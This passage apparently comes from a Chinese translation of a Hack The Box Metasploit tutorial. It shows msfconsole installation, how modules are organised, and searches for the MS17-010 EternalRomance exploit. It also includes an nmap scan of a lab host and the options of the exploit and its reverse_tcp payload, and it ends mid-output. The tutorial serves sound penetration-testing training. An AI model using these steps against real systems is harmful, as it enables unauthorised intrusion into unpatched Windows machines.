class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfconsole -q</span><br><span class="line"></span><br><span class="line">msf6 &gt; </span><br></pre></td></tr></table></figure><p>为了更好地查看所有可用命令，我们可以键入命令<code>help</code>。首先，我们的工具需要锋利。我们需要做的第一件事就是确保构成框架的模块是最新的，并且可以导入任何可供公众使用的新模块。</p><p>旧方法是<code>msfupdate</code>在我们的 OS 终端（外部<code>msfconsole</code>）中运行。但是，<code>apt</code>包管理器目前可以毫不费力地处理模块和功能的更新。</p><h4 id="安装-MSF"><a href="#安装-MSF" class="headerlink" title="安装 MSF"></a>安装 MSF</h4><p> 安装 MSF</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo apt update &amp;&amp; sudo apt install metasploit-framework</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">(Reading database ... 414458 files and directories currently installed.)</span><br><span class="line">Preparing to unpack .../metasploit-framework_6.0.2-0parrot1_amd64.deb ...</span><br><span class="line">Unpacking metasploit-framework (6.0.2-0parrot1) over (5.0.88-0kali1) ...</span><br><span class="line">Setting up metasploit-framework (6.0.2-0parrot1) ...</span><br><span class="line">Processing triggers for man-db (2.9.1-1) ...</span><br><span class="line">Scanning application launchers</span><br><span class="line">Removing duplicate launchers from Debian</span><br><span class="line">Launchers are updated</span><br></pre></td></tr></table></figure><p>我们将在本模块中介绍的首要步骤之一是<code>exploit</code>为我们的<code>target</code>. 然而，在尝试任何利用之前，我们需要对自身有一个详细的了解<code>target</code>。这涉及<code>Enumeration</code>在任何类型的利用尝试之前的过程。</p><p>在 期间<code>Enumeration</code>，我们必须查看我们的目标并确定其上运行的是哪些面向公众的服务。例如，它是一个 HTTP 服务器吗？它是一个FTP服务器吗？它是 SQL 数据库吗？这些不同的<code>target</code>类型在现实世界中差别很大。我们需要从全面了解<code>scan</code>目标的 IP 地址开始，以确定正在运行的服务以及为每个服务安装的版本。</p><p>我们会注意到，在我们进行过程中，版本是该过程中的关键组件<code>Enumeration</code>，它将使我们能够确定目标是否易受攻击。以前易受攻击的服务的未修补版本或可公开访问的平台中的过时代码通常是我们进入系统的入口点<code>target</code>。</p><hr><h2 id="MSF-参与结构"><a href="#MSF-参与结构" class="headerlink" title="MSF 参与结构"></a>MSF 参与结构</h2><p>MSF 参与结构可分为五个主要类别。</p><ul><li>枚举</li><li>准备</li><li>开发</li><li>特权升级</li><li>开发后</li></ul><p>这种划分使我们更容易以更结构化的方式查找和选择适当的 MSF 功能，并相应地使用它们。这些类别中的每一个都有用于特定目的的不同子类别。这些包括，例如，服务验证和漏洞研究。</p><p>因此，我们熟悉这种结构至关重要。因此，我们将查看此框架的组件以更好地理解它们之间的关系。</p><p><img src="/img/METASPLOIT2.png"></p><p>我们将在本模块中逐一介绍这些类别，但我们建议您自己查看各个组件并深入挖掘。尝试不同的功能是学习新工具或技能不可或缺的一部分。因此，我们应该在接下来的实验室中尝试所有可以想象到的东西，并独立分析结果。</p><h2 id="模块-1"><a href="#模块-1" class="headerlink" title="模块"></a>模块</h2><p>正如我们之前提到的，Metasploit<code>modules</code>是具有特定目的和相应功能的准备脚本，这些脚本已经在野外开发和测试过。该<code>exploit</code>类别由所谓的概念验证 ( <code>POCs</code>) 组成，可用于以很大程度上自动化的方式利用现有漏洞。很多人常常认为，漏洞利用的失败证明了疑似漏洞的存在。然而，这只是证明 Metasploit 漏洞不起作用，并不能证明该漏洞不存在。这是因为许多漏洞需要根据目标主机进行定制才能使漏洞发挥作用。因此，诸如 Metasploit 框架之类的自动化工具只能被视为一种支持工具，不能替代我们的手动技能。</p><p>一旦进入<code>msfconsole</code>，我们就可以从包含所有可用 Metasploit 模块的广泛列表中进行选择。它们中的每一个都被组织成文件夹，如下所示：</p><h4 id="句法"><a href="#句法" class="headerlink" title="句法"></a>句法</h4><p> 句法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;No.&gt; &lt;type&gt;/&lt;os&gt;/&lt;service&gt;/&lt;name&gt;</span><br></pre></td></tr></table></figure><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p> 例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">794   exploit/windows/ftp/scriptftp_list</span><br></pre></td></tr></table></figure><h4 id="索引号"><a href="#索引号" class="headerlink" title="索引号"></a>索引号</h4><p>将显示标签<code>No.</code>以选择我们之后在搜索过程中想要的漏洞利用。稍后我们将看到<code>No.</code>标签对选择特定的 Metasploit 模块有多大帮助。</p><h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><p>标签<code>Type</code>是 Metasploit 之间的第一级隔离<code>modules</code>。查看此字段，我们可以知道此模块的代码段将完成什么。例如，其中一些<code>types</code>不能像模块那样直接使用。<code>exploit</code>但是，他们将在可交互的结构旁边引入结构，以实现更好的模块化。为了更好地解释，以下是该字段中可能出现的类型：</p><table><thead><tr><th><strong>类型</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>Auxiliary</code></td><td>扫描、模糊测试、嗅探和管理功能。提供额外的帮助和功能。</td></tr><tr><td><code>Encoders</code></td><td>确保有效负载完好无损地到达目的地。</td></tr><tr><td><code>Exploits</code></td><td>定义为利用允许有效载荷传递的漏洞的模块。</td></tr><tr><td><code>NOPs</code></td><td>（无操作代码）在攻击尝试中保持负载大小一致。</td></tr><tr><td><code>Payloads</code></td><td>代码远程运行并回调攻击者机器以建立连接（或 shell）。</td></tr><tr><td><code>Plugins</code></td><td>附加脚本可以集成在一个评估中并<code>msfconsole</code>与之共存。</td></tr><tr><td><code>Post</code></td><td>用于收集信息、深入研究等的广泛模块。</td></tr></tbody></table><p>请注意，在选择用于有效载荷传输的模块时，该命令只能与以下可用作（或可交互模块）<code>use &lt;no.&gt;</code>的模块一起使用：<code>initiators</code></p><table><thead><tr><th><strong>类型</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>Auxiliary</code></td><td>扫描、模糊测试、嗅探和管理功能。提供额外的帮助和功能。</td></tr><tr><td><code>Exploits</code></td><td>定义为利用允许有效载荷传递的漏洞的模块。</td></tr><tr><td><code>Post</code></td><td>用于收集信息、深入研究等的广泛模块。</td></tr></tbody></table><h4 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h4><p>该<code>OS</code>标记指定为哪个操作系统和体系结构创建模块。自然地，不同的操作系统需要运行不同的代码以获得期望的结果。</p><h4 id="servive"><a href="#servive" class="headerlink" title="servive"></a>servive</h4><p>该<code>Service</code>标签指的是目标机器上运行的易受攻击的服务。对于某些模块，例如 the<code>auxiliary</code>或<code>post</code>ones，此标记可以指更一般的活动<code>gather</code>，例如，指的是收集凭据。</p><h4 id="name"><a href="#name" class="headerlink" title="name"></a>name</h4><p>最后，<code>Name</code>标签解释了使用为特定目的创建的模块可以执行的实际操作。</p><h2 id="搜索模块"><a href="#搜索模块" class="headerlink" title="搜索模块"></a>搜索模块</h2><p>Metasploit 还为现有模块提供完善的搜索功能。借助此功能，我们可以使用 specific 快速搜索所有模块，<code>tags</code>以找到适合我们目标的模块。</p><h4 id="MSF-搜索功能"><a href="#MSF-搜索功能" class="headerlink" title="MSF - 搜索功能"></a>MSF - 搜索功能</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; help search</span><br><span class="line"></span><br><span class="line">Usage: search [&lt;options&gt;] [&lt;keywords&gt;:&lt;value&gt;]</span><br><span class="line"></span><br><span class="line">Prepending a value with &#x27;-&#x27; will exclude any matching results.</span><br><span class="line">If no options or keywords are provided, cached results are displayed.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line">  -h                   Show this help information</span><br><span class="line">  -o &lt;file&gt;            Send output to a file in csv format</span><br><span class="line">  -S &lt;string&gt;          Regex pattern used to filter search results</span><br><span class="line">  -u                   Use module if there is one result</span><br><span class="line">  -s &lt;search_column&gt;   Sort the research results based on &lt;search_column&gt; in ascending order</span><br><span class="line">  -r                   Reverse the search results order to descending order</span><br><span class="line"></span><br><span class="line">Keywords:</span><br><span class="line">  aka              :  Modules with a matching AKA (also-known-as) name</span><br><span class="line">  author           :  Modules written by this author</span><br><span class="line">  arch             :  Modules affecting this architecture</span><br><span class="line">  bid              :  Modules with a matching Bugtraq ID</span><br><span class="line">  cve              :  Modules with a matching CVE ID</span><br><span class="line">  edb              :  Modules with a matching Exploit-DB ID</span><br><span class="line">  check            :  Modules that support the &#x27;check&#x27; method</span><br><span class="line">  date             :  Modules with a matching disclosure date</span><br><span class="line">  description      :  Modules with a matching description</span><br><span class="line">  fullname         :  Modules with a matching full name</span><br><span class="line">  mod_time         :  Modules with a matching modification date</span><br><span class="line">  name             :  Modules with a matching descriptive name</span><br><span class="line">  path             :  Modules with a matching path</span><br><span class="line">  platform         :  Modules affecting this platform</span><br><span class="line">  port             :  Modules with a matching port</span><br><span class="line">  rank             :  Modules with a matching rank (Can be descriptive (ex: &#x27;good&#x27;) or numeric with comparison operators (ex: &#x27;gte400&#x27;))</span><br><span class="line">  ref              :  Modules with a matching ref</span><br><span class="line">  reference        :  Modules with a matching reference</span><br><span class="line">  target           :  Modules affecting this target</span><br><span class="line">  type             :  Modules of a specific type (exploit, payload, auxiliary, encoder, evasion, post, or nop)</span><br><span class="line"></span><br><span class="line">Supported search columns:</span><br><span class="line">  rank             :  Sort modules by their exploitabilty rank</span><br><span class="line">  date             :  Sort modules by their disclosure date. Alias for disclosure_date</span><br><span class="line">  disclosure_date  :  Sort modules by their disclosure date</span><br><span class="line">  name             :  Sort modules by their name</span><br><span class="line">  type             :  Sort modules by their type</span><br><span class="line">  check            :  Sort modules by whether or not they have a check method</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">  search cve:2009 type:exploit</span><br><span class="line">  search cve:2009 type:exploit platform:-linux</span><br><span class="line">  search cve:2009 -s name</span><br><span class="line">  search type:exploit -s type -r</span><br></pre></td></tr></table></figure><p>例如，我们可以尝试查找<code>EternalRomance</code>旧版 Windows 操作系统的漏洞。这可能看起来像这样：</p><h4 id="MSF-寻找永恒的浪漫"><a href="#MSF-寻找永恒的浪漫" class="headerlink" title="MSF - 寻找永恒的浪漫"></a>MSF - 寻找永恒的浪漫</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search eternalromance</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                  Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                  ---------------  ----    -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; search eternalromance type:exploit</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                  Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                  ---------------  ----    -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br></pre></td></tr></table></figure><p>我们还可以使我们的搜索更粗略一些，并将其减少到一类服务。例如，对于 CVE，我们可以指定年份 ( <code>cve:&lt;year&gt;</code>)、平台 Windows ( <code>platform:&lt;os&gt;</code>)、我们要查找的模块类型 ( <code>type:&lt;auxiliary/exploit/post&gt;</code>)、可靠性等级 ( <code>rank:&lt;rank&gt;</code>) 和搜索名称 ( <code>&lt;pattern&gt;</code>)。这会将我们的结果缩减为仅符合上述所有条件的结果。</p><h4 id="MSF-特定搜索"><a href="#MSF-特定搜索" class="headerlink" title="MSF - 特定搜索"></a>MSF - 特定搜索</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search type:exploit platform:windows cve:2021 rank:excellent microsoft</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                            Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                            ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/http/exchange_proxylogon_rce    2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE</span><br><span class="line">   1  exploit/windows/http/exchange_proxyshell_rce    2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE</span><br><span class="line">   2  exploit/windows/http/sharepoint_unsafe_control  2021-05-11       excellent  Yes    Microsoft SharePoint Unsafe Control and ViewState RCE</span><br></pre></td></tr></table></figure><h2 id="模块选择"><a href="#模块选择" class="headerlink" title="模块选择"></a>模块选择</h2><p>要选择我们的第一个模块，我们首先需要找到一个。假设我们有一个目标正在运行易受 EternalRomance (MS17_010) 攻击的 SMB 版本。我们发现扫描目标时SMB服务器端口445是开放的。</p><p> MSF - 特定搜索</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ nmap -sV 10.10.10.40</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 21:38 UTC</span><br><span class="line">Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Nmap scan report for 10.10.10.40</span><br><span class="line">Host is up (0.051s latency).</span><br><span class="line">Not shown: 991 closed ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 60.87 seconds</span><br></pre></td></tr></table></figure><p>我们将启动<code>msfconsole</code>并搜索这个确切的漏洞名称。</p><h4 id="MSF-搜索-MS17-010"><a href="#MSF-搜索-MS17-010" class="headerlink" title="MSF - 搜索 MS17_010"></a>MSF - 搜索 MS17_010</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ms17_010</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                      Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                      ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection</span><br></pre></td></tr></table></figure><p>接下来，我们要为这个场景选择合适的模块。从<code>Nmap</code>扫描中，我们检测到 SMB 服务在版本 上运行<code>Microsoft Windows 7 - 10</code>。通过一些额外的操作系统扫描，我们可以猜测这是一个运行易受攻击的 SMB 实例的 Windows 7。然后我们继续选择模块以<code>index no. 2</code>测试目标是否易受攻击。</p><h2 id="使用模块"><a href="#使用模块" class="headerlink" title="使用模块"></a>使用模块</h2><p>在交互式模块中，我们可以指定几个选项。这些用于使 Metasploit 模块适应给定的环境。因为在大多数情况下，我们总是需要扫描或攻击不同的IP地址。因此，我们需要这种功能来设置我们的目标并对其进行微调。要检查在将漏洞发送到目标主机之前需要设置哪些选项，我们可以使用命令<code>show options</code>。在利用发生之前需要设置的所有内容都将<code>Yes</code>在该<code>Required</code>列下显示。</p><h4 id="MSF-选择模块"><a href="#MSF-选择模块" class="headerlink" title="MSF - 选择模块"></a>MSF - 选择模块</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                  Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                  ---------------  ----    -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">msf6 &gt; use 0</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_psexec): </span><br><span class="line"></span><br><span class="line">   Name                  Current Setting                          Required  Description</span><br><span class="line">   ----                  ---------------                          --------  -----------</span><br><span class="line">   DBGTRACE              false                                    yes       Show extra debug trace info</span><br><span class="line">   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction</span><br><span class="line">   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)</span><br><span class="line">   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check</span><br><span class="line">                         rdlists/named_pipes.txt</span><br><span class="line">   RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework</span><br><span class="line">                                                                            /wiki/Using-Metasploit</span><br><span class="line">   RPORT                 445                                      yes       The Target port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                                           no        The service display name</span><br><span class="line">   SERVICE_NAME                                                   no        The service name</span><br><span class="line">   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no</span><br><span class="line">                                                                            rmal read/write folder share</span><br><span class="line">   SMBDomain             .                                        no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                        no        The password for the specified username</span><br><span class="line">   SMBUser                                                        no        The username to authenticate as</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure><p>在这里，我们<code>No.</code>可以看到标签有多大帮助。因为现在，我们不必在搜索中键入整个路径，而只需键入分配给 Metasploit 模块的编号。<code>info</code>如果我们想了解更多关于模块的信息，可以在选择模块后使用命令。这将为我们提供一系列对我们很重要的信息。</p><h4 id="MSF-模块信息"><a href="#MSF-模块信息" class="headerlink" title="MSF - 模块信息"></a>MSF - 模块信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; info</span><br><span class="line"></span><br><span class="line">       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">     Module: exploit/windows/smb/ms17_010_psexec</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: x86, x64</span><br><span class="line"> Privileged: No</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Normal</span><br><span class="line">  Disclosed: 2017-03-14</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  sleepya</span><br><span class="line">  zerosum0x0</span><br><span class="line">  Shadow Brokers</span><br><span class="line">  Equation Group</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  0   Automatic</span><br><span class="line">  1   PowerShell</span><br><span class="line">  2   Native upload</span><br><span class="line">  3   MOF upload</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  Yes</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name                  Current Setting                          Required  Description</span><br><span class="line">  ----                  ---------------                          --------  -----------</span><br><span class="line">  DBGTRACE              false                                    yes       Show extra debug trace info</span><br><span class="line">  LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction</span><br><span class="line">  NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)</span><br><span class="line">  NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check</span><br><span class="line">                        rdlists/named_pipes.txt</span><br><span class="line">  RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/</span><br><span class="line">                                                                           wiki/Using-Metasploit</span><br><span class="line">  RPORT                 445                                      yes       The Target port (TCP)</span><br><span class="line">  SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing</span><br><span class="line">  SERVICE_DISPLAY_NAME                                           no        The service display name</span><br><span class="line">  SERVICE_NAME                                                   no        The service name</span><br><span class="line">  SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a nor</span><br><span class="line">                                                                           mal read/write folder share</span><br><span class="line">  SMBDomain             .                                        no        The Windows domain to use for authentication</span><br><span class="line">  SMBPass                                                        no        The password for the specified username</span><br><span class="line">  SMBUser                                                        no        The username to authenticate as</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line">  Space: 3072</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module will exploit SMB with vulnerabilities in MS17-010 to </span><br><span class="line">  achieve a write-what-where primitive. This will then be used to </span><br><span class="line">  overwrite the connection session information with as an </span><br><span class="line">  Administrator session. From there, the normal psexec payload code </span><br><span class="line">  execution is done. Exploits a type confusion between Transaction and </span><br><span class="line">  WriteAndX requests and a race condition in Transaction requests, as </span><br><span class="line">  seen in the EternalRomance, EternalChampion, and EternalSynergy </span><br><span class="line">  exploits. This exploit chain is more reliable than the EternalBlue </span><br><span class="line">  exploit, but requires a named pipe.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010</span><br><span class="line">  https://nvd.nist.gov/vuln/detail/CVE-2017-0143</span><br><span class="line">  https://nvd.nist.gov/vuln/detail/CVE-2017-0146</span><br><span class="line">  https://nvd.nist.gov/vuln/detail/CVE-2017-0147</span><br><span class="line">  https://github.com/worawit/MS17-010</span><br><span class="line">  https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf</span><br><span class="line">  https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/</span><br><span class="line"></span><br><span class="line">Also known as:</span><br><span class="line">  